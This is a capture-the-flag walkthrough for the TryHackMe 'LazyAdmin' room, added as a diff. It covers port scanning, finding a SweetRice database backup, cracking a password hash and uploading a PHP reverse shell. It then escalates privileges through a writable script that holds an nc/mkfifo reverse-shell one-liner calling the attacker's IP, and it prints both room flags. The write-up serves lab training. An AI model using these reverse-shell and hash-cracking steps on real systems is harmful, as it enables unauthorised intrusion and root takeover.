@@ -1,0 +1,106 @@
+All steps and concepts about CTF made on https://tryhackme.com/room/lazyadmin :
+
+1 - PortScaning
+
+    nmap -sV 10.10.224.126
+
+    PORT   STATE SERVICE VERSION
+    22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+    80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+ 
+2 - List paths and directories with Dirb
+
+    dirb http://10.10.224.126/ 
+
+    This is a CMS "SweetRice" page on /content
+
+3 - Since we know CMS is 'SweetRice' , we can 'exploit vulnerabilities' on https://exploit-db.com
+
+4 - https://www.exploit-db.com/exploits/40718
+
+    Says that http://10.10.224.126/content/inc/mysql_backup can be downloaded backup of database
+
+5 - Doing simple search on file content by "user", "password", found: 
+
+    \"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:
+
+    That maybe be a hash for password, and we can translate with 'hashcat'
+
+6 - Use the hashcat command : (Use AttackMachine, because memory limit of virtualbox throw error)
+
+    cd /usr/share/wordlists
+
+    hashcat -m 0 42f749ade7f9e195bf475f37a44cafcb rockyou.txt
+
+    returns:
+
+    42f749ade7f9e195bf475f37a44cafcb:Password123
+
+7 - Dirb return has a path on /content/as to login with a user manager:Password123
+
+8 - In the 'Ads' section, we can add a script to get a reverse connection I have downloaded a Php reverse shell script from scripts/php-reverse-shell:
+
+    Just edit the HOST/PORT and upload this on this section.
+
+9 - Open with nc the port on AttackMachine
+
+    nc -nlv 3333
+
+10 - Execute the shell on path /content/inc/ads/ clicking on shell.php
+
+    The connection wi'll be created, so just use the command line of AttackMachine
+
+11 - whoami returns the user 'www-data', and on /home/itguy/user.txt , get content first flag:
+
+    THM{63e5bce9271952aad1113b6f1ac28a07}
+
+12 - Escalete Privilege :
+
+12.1 - check permission do we have "sudo -l" 
+
+    /usr/bin/perl /home/itguy/backup.pl
+
+    We dont have privilege to write the backup.pl , just write
+
+12.2 - The backup.pl content:
+
+    #!/usr/bin/perl
+    system("sh","/etc/copy.sh")
+
+12.3 - This scripts runs a bash "/etc/copy.sh"
+
+    cat etc/copy.sh
+
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 192.168.0.190 5554 >/tmp/f
+
+12.4 - Now we checked for permissions we can write to this file and execute there is already a reverse shell script is present so we just 
+    have to change the IP address (AttackMachine) and port it will give us a reverse connection we tried editing the file using nano and vim but it 
+    didn’t work so we used “echo” command.
+
+    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 10.10.224.126 3334 >/tmp/f" 
+
+12.5 On other tab terminal of AttackMachine, open port 3334 with netcat 
+
+    nc -nlv 3334
+
+13. Execute the backup.pl
+
+    sudo /usr/bin/perl /home/itguy/backup.pl
+
+    The second tab will connect with root user
+
+14 - Just get content of /root/root.txt
+
+    THM{6637f41d0177b6f37cb20d775124699f}
+
+
+Concepts:
+#PortScaning
+#Dirb
+#ReverseConection
+#Escalete Privilege
+
+Helps:
+https://www.sevenlayers.com/index.php/354-tryhackme-lazyadmin-walkthrough
+https://infosecwriteups.com/lazy-admin-walkthrough-tryhackme-158540d2ec24
